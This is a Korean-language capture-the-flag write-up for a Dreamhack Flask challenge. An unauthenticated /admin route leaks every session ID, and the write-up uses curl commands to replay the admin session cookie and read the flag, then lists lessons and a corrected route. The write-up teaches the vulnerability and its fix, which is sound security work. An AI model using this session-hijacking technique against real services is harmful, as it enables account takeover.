# Dreamhack `session` 웹 문제 풀이 (writeup)

## 문제 개요

Flask로 작성된 간단한 로그인 서비스(`app.py`)다. `guest`, `user`, `admin` 세 계정이 있고
`admin`의 비밀번호가 곧 플래그(`FLAG`)다. 목표는 `admin`으로 인증된 세션을 얻어서
메인 페이지(`/`)에 노출되는 플래그를 읽는 것.

```python
users = {
    'guest': 'guest',
    'user': 'user1234',
    'admin': FLAG        # <- 이 값은 알 수 없다
}
```

로그인에 성공하면 서버가 `os.urandom(32).hex()`로 32바이트(64 hex) 랜덤 세션 ID를 만들어
서버 측 딕셔너리 `session_storage`에 `{session_id: username}` 형태로 저장하고,
그 값을 `sessionid` 쿠키로 내려준다. 이후 `/`에 접속하면 쿠키의 세션 ID로 사용자를 식별한다.

```python
@app.route('/')
def index():
    session_id = request.cookies.get('sessionid', None)
    username = session_storage[session_id]     # 쿠키 -> 사용자명
    return render_template('index.html',
        text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not admin"}')
```

서버는 시작 시점에 admin 세션도 미리 하나 만들어 저장해 둔다:

```python
session_storage[os.urandom(32).hex()] = 'admin'
```

주석에는 "brute forcing으로는 admin 세션 ID를 절대 못 알아낸다 haha"라고 적혀 있다.
맞다 — 64 hex(256비트)를 무차별 대입하는 건 불가능하다. **하지만 브루트포스가 필요 없다.**

## 취약점: 인증이 빠진 `/admin`

핵심은 `/admin` 라우트다. 개발자가 인증 검사 코드를 작성해 두고 **주석 처리한 채**
`session_storage` 딕셔너리 전체를 그대로 반환한다.

```python
@app.route('/admin')
def admin():
    # developer's note: review below commented code and uncomment it (TODO)
    #session_id = request.cookies.get('sessionid', None)
    #username = session_storage[session_id]
    #if username != 'admin':
    #    return render_template('index.html')
    return session_storage        # <-- 전체 세션 저장소가 그대로 노출됨
```

Flask는 뷰가 dict를 반환하면 자동으로 JSON으로 직렬화한다. 따라서 인증 없이 `/admin`에
접속하기만 하면 서버에 저장된 **모든 세션 ID와 그 소유자**가 응답으로 튀어나온다.
여기엔 서버 시작 시 만들어진 **admin의 세션 ID도 포함**된다.

즉, 랜덤성이 강해서 못 맞히는 게 아니라, 서버가 정답을 스스로 알려주는 구조다.
브루트포스 방어("절대 못 맞힌다")는 정보 노출 취약점 앞에서 무의미하다.

## 익스플로잇

1. `GET /admin` → `session_storage` 전체 노출. 값이 `"admin"`인 세션 ID를 찾는다.
2. 그 세션 ID를 `sessionid` 쿠키로 설정한다.
3. `GET /` → `index()`가 쿠키를 admin으로 인식하고 플래그를 출력한다.

### 수동 재현 (curl)

```bash
# 1) admin 세션 ID 확보
curl -s http://HOST:PORT/admin
# {"<some_64hex>": "admin"}  형태로 노출됨

# 2) 그 값을 쿠키로 넣고 메인 페이지 요청
curl -s http://HOST:PORT/ --cookie "sessionid=<some_64hex>"
# ... Hello admin, flag is DH{...} ...
```

### 자동화 스크립트

같은 디렉터리의 [`solve.py`](./solve.py)가 위 3단계를 자동으로 수행한다.

```bash
python3 solve.py http://HOST:PORT
# [*] /admin leaked N session(s)
# [+] admin sessionid = <64 hex>
# [+] FLAG: DH{...}
```

## 정리 / 교훈

- **인증·인가 검사를 주석으로 남겨 두면 안 된다.** TODO로 미뤄둔 인증 코드가
  그대로 배포되면서 관리 기능이 무방비로 노출됐다.
- **관리자 전용 엔드포인트에서 내부 상태(세션 저장소)를 그대로 덤프하면 안 된다.**
  세션 ID는 자격증명과 동등하다. 노출되는 순간 계정 탈취로 이어진다.
- **"추측 불가능"에 기대는 방어는 정보 노출 앞에서 무력하다.** 세션 ID의 엔트로피가
  아무리 높아도, 다른 경로로 값이 새면 끝이다. 접근 통제는 각 엔드포인트에서
  실제로 수행돼야 한다.

## 올바른 수정

`/admin`의 주석 처리된 인증 검사를 되살리고, 세션 저장소 원본을 반환하지 않도록 한다:

```python
@app.route('/admin')
def admin():
    session_id = request.cookies.get('sessionid', None)
    if session_storage.get(session_id) != 'admin':
        return render_template('index.html'), 403
    # 필요한 정보만, 세션 ID 같은 민감값은 제외하고 반환
    return {'users': list(session_storage.values())}
```
